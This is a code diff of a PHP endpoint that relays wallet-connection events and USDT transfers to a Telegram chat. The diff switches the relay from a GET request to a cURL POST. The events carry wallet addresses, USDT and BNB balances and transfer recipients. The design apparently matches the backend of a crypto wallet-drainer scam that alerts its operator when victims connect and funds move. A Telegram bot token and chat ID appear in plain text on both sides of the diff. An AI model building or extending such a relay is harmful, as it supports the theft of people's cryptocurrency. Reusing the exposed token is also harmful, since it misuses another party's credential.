@@ -1,41 +1,60 @@
 <?php
-date_default_timezone_set('Asia/Kolkata');
+$botToken = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
+$chatId = '8191508290';
 
-// Telegram config
-$botToken = "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM";
-$chatId = "8191508290";
-
-// Get POST data
 $data = json_decode(file_get_contents("php://input"), true);
 
-$type = $data["type"]; // "connect" or "tx"
-$wallet = $data["wallet"] ?? "N/A";
-$usdt = $data["usdt"] ?? "0";
-$bnb = $data["bnb"] ?? "0";
-$to = $data["to"] ?? "";
-$time = date("d-m-Y h:i:s A");
-
-// Format message
-if ($type === "connect") {
-    $msg = "🟢 *Wallet Connected*\n\n👛 *Wallet:* `$wallet`\n💵 *USDT:* $usdt\n🪙 *BNB:* $bnb\n🕒 *Time:* $time";
-} elseif ($type === "tx") {
-    $msg = "✅ *USDT Transfer*\n\n👛 *From:* `$wallet`\n➡️ *To:* `$to`\n💵 *Amount:* $usdt USDT\n🕒 *Time:* $time";
-} else {
-    http_response_code(400);
-    echo "Invalid type";
+if (!$data || !isset($data['type'])) {
+    echo json_encode(['status' => 'invalid request']);
     exit;
 }
 
-// Send message to Telegram
+$type = $data['type'];
+
+if ($type === 'connect') {
+    $wallet = htmlspecialchars($data['wallet']);
+    $usdt = htmlspecialchars($data['usdt']);
+    $bnb = htmlspecialchars($data['bnb']);
+
+    $message = "🟢 *New Wallet Connected*\n\n" .
+               "👛 Wallet: `$wallet`\n" .
+               "💵 USDT: *$usdt*\n" .
+               "🪙 BNB: *$bnb*\n" .
+               "⏰ Time: " . date("Y-m-d H:i:s");
+
+} elseif ($type === 'transaction') {
+    $wallet = htmlspecialchars($data['wallet']);
+    $usdt = htmlspecialchars($data['usdt']);
+    $receiver = htmlspecialchars($data['receiver']);
+
+    $message = "✅ *USDT Transferred*\n\n" .
+               "👛 From: `$wallet`\n" .
+               "💵 USDT: *$usdt*\n" .
+               "📥 To: `$receiver`\n" .
+               "🕒 Time: " . date("Y-m-d H:i:s");
+
+} else {
+    echo json_encode(['status' => 'unknown type']);
+    exit;
+}
+
+// Send Telegram message
 $url = "https://api.telegram.org/bot$botToken/sendMessage";
 $params = [
-    "chat_id" => $chatId,
-    "text" => $msg,
-    "parse_mode" => "Markdown"
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'Markdown'
 ];
 
-file_get_contents($url . "?" . http_build_query($params));
+$ch = curl_init();
+curl_setopt_array($ch, [
+    CURLOPT_URL => $url,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => $params,
+]);
+curl_exec($ch);
+curl_close($ch);
 
-http_response_code(200);
-echo "Notification sent";
+echo json_encode(['status' => 'sent']);
 ?>
